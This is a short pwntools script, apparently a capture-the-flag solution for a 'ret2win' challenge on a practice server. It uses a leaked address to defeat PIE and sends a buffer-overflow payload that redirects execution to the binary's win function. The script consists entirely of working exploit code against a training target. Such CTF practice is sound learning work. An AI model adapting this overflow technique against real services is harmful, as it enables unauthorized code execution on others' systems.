from pwn import *
p = remote("playground.tcp1p.team",19003)
offset = 120
elf = context.binary = ELF("./ret2win")
# p = process()
print(hex(elf.sym['main']))
p.recvuntil('you: ')
main = int(p.recvline(), 16)
elf.address = main - 0x404c
win = p64(elf.sym['win'])
ret = p64(elf.sym['main'] + 85)
payload = b"A" * offset + ret + win
p.sendline(payload)
print(p.recvall())
